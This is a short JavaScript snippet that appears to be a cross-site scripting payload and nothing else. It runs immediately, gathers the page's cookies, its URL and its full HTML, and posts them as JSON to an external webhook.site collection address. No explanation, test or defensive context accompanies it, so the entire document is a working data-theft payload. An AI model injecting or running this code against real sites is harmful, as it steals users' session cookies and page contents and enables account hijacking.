(() => {
    const data = {
        cookie: document.cookie,
        location: location.href,
        html: document.documentElement.innerHTML
    };

    fetch("https://webhook.site/3e6eeb5f-e3bf-4897-8665-8d129a856869", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
    });
})();


